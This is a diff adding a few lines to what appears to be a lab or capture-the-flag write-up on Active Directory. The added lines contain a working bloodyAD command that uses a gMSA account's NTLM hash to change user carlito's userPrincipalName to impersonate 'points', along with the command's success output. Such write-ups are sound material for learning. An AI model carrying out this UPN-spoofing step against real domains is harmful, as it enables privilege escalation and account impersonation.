@@ -741,5 +741,9 @@ So according to the article i need to change the UPN of an account so i need an 
 So ill run bloodyAD with `get writable --detail` and i see the user `casper-gmsa$` has write on this attribute so i can use that account to modify it!
 
 ```python
-
+bloodyAD --host DC01.casper.hsm -d casper.hsm -u casper-gmsa$ -p ':7abcd8de1d2e107237f8fd5baea13d68' set object carlito userPrincipalName -v 'points'
+[+] carlito's userPrincipalName has been updated
 ```
+
+I chose `points` as the user since he is part of the some interesting groups!
+
